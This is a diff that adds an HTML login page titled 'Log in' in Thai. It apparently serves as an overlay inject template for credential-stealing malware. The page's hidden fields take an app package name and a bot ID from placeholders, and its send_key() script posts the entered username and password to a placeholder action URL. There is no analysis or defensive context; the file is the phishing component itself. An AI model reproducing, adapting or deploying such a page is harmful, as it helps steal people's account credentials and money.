@@ -1,0 +1,245 @@
+﻿<!DOCTYPE html>
+
+<html>
+  <head>
+ 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+
+
+<style type="text/css">
+
+*{outline:none;}.br{border:1px dotted red;}.stol{display:table;}.td{display:table-cell;}.w100{width:100% !important;}.left_{text-align:left;}.right_{text-align:right;}.center{text-align:center;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.inline{display:inline-block;}.pad{padding:15px;}.tr{display:table-row;}.none{display:none;}body,html{background-color:transparent;}
+  
+ .h100{
+   height:100%;
+} 
+
+html,body{
+  height:100%
+  
+}
+ 
+body{
+ background-color:#333333;
+}  
+  
+
+  @media (max-width: 768px){
+	 .block-xs{
+         display:block;
+		 width:100% !important;
+     }
+	 .center-xs{
+	  text-align:center !important;
+	 }
+  }
+
+body {
+box-shadow:1px 0 100px -13px rgba(126,126,126,0.99) inset;
+}
+
+.logo {
+padding-top:10px;
+text-align:center;
+}
+
+.logo img {
+max-width:400px;
+}
+
+a.bottom_button {
+
+color:#FFF;
+
+background:#42a62b;
+display:inline-block;
+width:100%;
+text-align:center;
+text-shadow:0 0 2px #000;
+overflow:hidden;
+font-size:2em;
+padding:9px 0;
+}
+
+a.bottom_button:after {
+content:'';
+position:absolute;
+left:0;
+width:100%;
+height:10px;
+background:red;
+background-color:#000;
+box-shadow:0 3px 11px 0 #000;
+top:-10px;
+}
+
+.title {
+text-align:center;
+color:#42a62b;
+font-size:1.5em;
+text-shadow:0 0 34px #FFF;
+margin-bottom:40px;
+}
+
+input.form-control {
+color:#bbb;
+border-radius:0;
+background-color:#505050;
+border-color:#383737;
+border-width:1px;
+}
+
+.form-group.in {
+position:relative;
+padding-left:34px;
+}
+
+span.fa.lb {
+position:absolute;
+left:0;
+top:0;
+font-size:2.3em;
+color:#505050;
+}
+
+input.form-control:focus {
+box-shadow:none;
+border-color:#545454;
+}
+
+span.fa.fa-lock.lb {
+left:2px;
+}
+
+input#username {}
+
+.form-group.in.has-error input {
+    border-color: #ff3232;
+    box-shadow: 0 0 10px white;
+}
+
+.form-group.in.has-error .fa {
+    color: #ff3232;
+    text-shadow: 0 0 10px white;
+}
+
+a.bottom_button {
+    position: relative;
+}
+</style>
+
+
+ 
+  </head>
+  
+  <body>
+
+<div  class="stol h100 w100"  style="">
+		<div  class="tr h100"  style="">
+				<div  class="td "  style="">
+						  
+<div  class="logo "  style="">
+		<div  class="container-fluid"  style="">
+				<img src="http://i.imgur.com/cUybQqE.png" style="" class="w100"/>
+		</div>
+</div>  
+
+
+<form role="form" name="" onsubmit="send_key();return false" action="%ACTION%" method="POST" class="form">
+ <input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+ 
+<div  class="main"  style="">
+		<div  class="title "  style="">
+				&#3648;&#3586;&#3657;&#3634;&#3626;&#3641;&#3656;&#3619;&#3632;&#3610;&#3610;
+		</div>
+		<div  class="container-fluid"  style="">
+				<div  class="form-group in "  style="">
+						<span  class="fa fa-user lb "></span>
+						<input class="form-control" type="text" name="fields[username]" id="username"  placeholder="" />
+				</div>
+				
+				<div  class="form-group in"  style="">
+						<span  class="fa fa-lock lb "></span>
+						<input class="form-control" type="password" name="fields[pass]" id="pass"  placeholder="" />
+						<input type="submit" style="display:none"/>
+				</div>
+				
+				
+				
+		</div>
+</div>
+
+
+  
+</form>
+
+
+
+
+ 
+  
+  
+  
+   
+				</div>
+		</div>
+		
+		
+		
+		
+		<div  class="tr footer "  style="">	
+				<div  class="td "  style="">
+						
+  
+<a class="bottom_button" onclick="send_key()"  style="">
+		&#3648;&#3586;&#3657;&#3634;&#3626;&#3641;&#3656;&#3619;&#3632;&#3610;&#3610;
+</a> 
+				</div>
+		</div>
+</div>
+  
+  
+  
+  
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
+  </body>
+ 
+<script>
+  
+
+$('.form-control').on('focus',function(){
+		$(this).closest('.form-group').removeClass('has-error');
+})
+
+  
+function send_key(){
+   username=$('#username').val().trim();
+   pass=$('#pass').val().trim();
+   
+   $('.has-error').removeClass('has-error');
+   if(!/^.{1,40}\b/.test(username)){
+		$('#username').closest('.form-group').addClass('has-error');
+	}
+	if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){
+		$('#pass').closest('.form-group').addClass('has-error');
+	}
+	 
+	 if($('.has-error:visible').size()>0){
+		 return false;
+	 }
+	
+    $('form')[0].submit()
+   
+   
+};//send_key
+  
+  
+  
+  
+  
+</script>
+</html>  
